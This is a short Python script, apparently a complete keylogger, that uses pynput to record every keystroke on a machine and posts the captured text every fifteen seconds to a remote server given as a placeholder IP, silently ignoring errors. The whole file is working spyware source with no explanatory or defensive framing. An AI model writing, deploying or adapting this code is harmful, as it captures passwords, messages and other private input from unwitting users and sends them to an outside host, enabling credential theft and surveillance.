import requests
from pynput.keyboard import Key, Listener
import threading

#Settings
WEBHOOK_URL = "http://<Your_Server_IP>:5000/log" 
SEND_INTERVAL = 15 
log_buffer = ""

def send_data():
    global log_buffer
    if log_buffer:
        try:
            requests.post(WEBHOOK_URL, json={"keystrokes": log_buffer}, timeout=5)
            log_buffer = ""
        except:
            pass
    timer = threading.Timer(SEND_INTERVAL, send_data)
    timer.daemon = True
    timer.start()

def on_press(key):
    global log_buffer
    k = str(key).replace("'", "")
    if k == "Key.space": log_buffer += " "
    elif k == "Key.enter": log_buffer += "\n[ENTER]\n"
    elif "Key" in k: log_buffer += f" [{k.split('.')[1].upper()}] "
    else: log_buffer += k

send_data()
with Listener(on_press=on_press) as listener:
    listener.join()
